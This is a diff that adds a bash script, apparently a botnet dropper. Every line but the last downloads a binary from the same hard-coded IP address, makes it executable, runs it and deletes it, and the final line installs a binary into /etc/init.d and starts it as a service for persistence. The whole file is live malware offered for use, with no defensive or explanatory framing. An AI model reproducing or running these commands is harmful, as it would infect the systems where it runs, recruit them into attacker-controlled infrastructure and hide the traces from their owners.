@@ -1,0 +1,15 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajalungka; chmod +x aajalungka; ./aajalungka; rm -rf aajalungka
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajamango; chmod +x aajamango; ./aajamango; rm -rf aajamango
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajaopenggl; chmod +x aajaopenggl; ./aajaopenggl; rm -rf aajaopenggl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajavast; chmod +x aajavast; ./aajavast; rm -rf aajavast
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajagreyps; chmod +x aajagreyps; ./aajagreyps; rm -rf aajagreyps
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajakuhamo; chmod +x aajakuhamo; ./aajakuhamo; rm -rf aajakuhamo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajamarco; chmod +x aajamarco; ./aajamarco; rm -rf aajamarco
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajachikos; chmod +x aajachikos; ./aajachikos; rm -rf aajachikos
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajapchikos; chmod +x aajapchikos; ./aajapchikos; rm -rf aajapchikos
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajacos; chmod +x aajacos; ./aajacos; rm -rf aajacos
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajafacebook3; chmod +x aajafacebook3; ./aajafacebook3; rm -rf aajafacebook3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aajanetdelds; chmod +x aajanetdelds; ./aajanetdelds; rm -rf aajanetdelds
+cd /etc/init.d; wget http://119.94.59.146/dbgrep; chmod 0777 dbgrep; ./dbgrep; service dbgrep start
